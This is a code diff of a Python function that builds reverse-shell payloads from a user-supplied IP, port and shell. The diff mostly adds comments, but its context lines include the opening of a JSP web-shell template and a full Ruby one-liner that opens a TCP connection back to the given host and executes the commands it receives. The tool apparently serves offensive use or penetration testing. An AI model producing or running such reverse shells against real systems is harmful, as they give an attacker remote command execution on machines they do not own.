@@ -1,5 +1,10 @@
+# Define a function to generate reverse shell commands based on user inputs
 def rev_shells_2(num, ip, port, shell):
+    
+    # Convert the port to a string
+    port = str(port)
 
+     # Define different reverse shell commands for various languages
     java_web = '''
 <%@
 page import="java.lang.*, java.util.*, java.io.*, java.net.*"
@@ -229,6 +234,7 @@ except KeyboardInterrupt:
 
     ruby_no_sh = '''ruby -rsocket -e'exit if fork;c=TCPSocket.new("'''+ip+'''","'''+port+'''");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''''
 
+    # Select and return the appropriate reverse shell command based on user input
     if num == 22:
         return java_web
     elif num == 23:
